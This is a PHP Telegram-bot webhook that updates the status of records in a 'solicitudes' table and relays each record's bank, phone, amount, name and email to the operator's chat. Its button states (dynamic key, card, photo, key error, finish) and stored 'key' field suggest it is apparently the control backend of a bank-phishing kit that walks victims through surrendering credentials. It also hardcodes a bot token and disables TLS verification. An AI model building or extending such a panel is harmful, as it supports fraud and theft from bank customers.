<?php
header("HTTP/1.1 200 OK");
header("Content-Type: application/json; charset=utf-8");

$raw = file_get_contents("php://input");
if ($raw === false || $raw === '') {
    echo json_encode(['ok'=>true]);
    exit;
}

$update = json_decode($raw, true);
if (!is_array($update)) {
    echo json_encode(['ok'=>true]);
    exit;
}

require_once __DIR__ . DIRECTORY_SEPARATOR . 'conexion.php';

$token = "8067654456:AAEBhilArTMwjCmZrxW2MPsPS4-yx9hSFYU";

function answerCallback($cbId, $text = 'OK', $showAlert = false) {
    global $token;
    $payload = json_encode([
        'callback_query_id' => $cbId,
        'text' => $text,
        'show_alert' => $showAlert,
    ]);
    $ch = curl_init("https://api.telegram.org/bot{$token}/answerCallbackQuery");
    if (!$ch) return false;
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);
    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    $out = curl_exec($ch);
    $code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    return ['ok' => $code >= 200 && $code < 300, 'code' => $code, 'body' => $out];
}

function tgSend($chatId, $text, $reply_markup = null) {
    global $token;
    $body = ['chat_id' => $chatId, 'text' => $text];
    if ($reply_markup) $body['reply_markup'] = $reply_markup;
    $payload = json_encode($body);
    $ch = curl_init("https://api.telegram.org/bot{$token}/sendMessage");
    if (!$ch) return false;
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);
    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    $out = curl_exec($ch);
    $code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    return ['ok' => $code >= 200 && $code < 300, 'code' => $code, 'body' => $out];
}

if (isset($update['callback_query']) && is_array($update['callback_query'])) {
    $cb = $update['callback_query'];
    $cbId = $cb['id'] ?? '';
    $data = $cb['data'] ?? '';
    $from = $cb['from']['id'] ?? 0;
    $chat = $cb['message']['chat']['id'] ?? 0;
    $msgId = $cb['message']['message_id'] ?? 0;

    $answered = false;
    $estado = null;
    $request_id = null;
    $opcion = null;

    if (preg_match('/^OPCION_(\d+)_(.+)$/', (string)$data, $m)) {
        $opcion     = (int)$m[1];
        $request_id = $m[2];
        $estado     = "opcion_" . $opcion;
    } elseif (preg_match('/^([a-zA-Z0-9_]+)_(.+)$/', (string)$data, $m)) {
        $estado     = $m[1];
        $request_id = $m[2];
    }

    if ($estado && $request_id) {
        try {
            global $pdo;
            $upd = $pdo->prepare("UPDATE solicitudes SET estado = ? WHERE request_id = ?");
            $upd->execute([$estado, $request_id]);

            $row = null;
            $sel = $pdo->prepare("SELECT request_id, `key`, numero_cuenta, monto, banco, estado, nombre, telefono, correo FROM solicitudes WHERE request_id = ? LIMIT 1");
            $sel->execute([$request_id]);
            $row = $sel->fetch(PDO::FETCH_ASSOC);

            $labelMap = [
                'opcion_1' => 'DINAMICA',
                'opcion_2' => 'TARJETA',
                'opcion_3' => 'ERROR_OP3',
                'opcion_4' => 'ERROR_OP4',
                'opcion_5' => 'FOTO',
                'opcion_6' => 'OPCION_6',
                'opcion_7' => 'OPCION_7',
                'opcion_8' => 'OPCION_8',
                'opcion_9' => 'ERROR_DINAMICA',
                'opcion_10' => 'FINALIZAR',
            ];
            $lbl = $labelMap[$estado] ?? strtoupper(str_replace('_', ' ', $estado));

            $lines = [];
            $lines[] = "✅ Estado actualizado: {$lbl}";
            if ($row) {
                $lines[] = "Request: " . ($row['request_id'] ?? '');
                $lines[] = "Banco: "   . ($row['banco'] ?? '');
                $lines[] = "Celular: " . ($row['numero_cuenta'] ?? '');
                $lines[] = "Monto: "   . ($row['monto'] ?? '');
                if (!empty($row['nombre']))   $lines[] = "Nombre: "   . $row['nombre'];
                if (!empty($row['correo']))   $lines[] = "Correo: "   . $row['correo'];
            }

            if ($chat) {
                tgSend($chat, implode("\n", $lines));
            }
            answerCallback($cbId, "{$lbl} aplicado ({$request_id})", false);
            $answered = true;
        } catch (Throwable $e) {
            $msg = $e->getMessage();
            if ($cbId) answerCallback($cbId, "Error: " . substr($msg, 0, 120), true);
            error_log("TG webhook error: " . $msg);
            $answered = true;
        }
    }

    if (!$answered && $cbId) {
        answerCallback($cbId, "OK");
    }
}

echo json_encode(['ok' => true]);
exit;
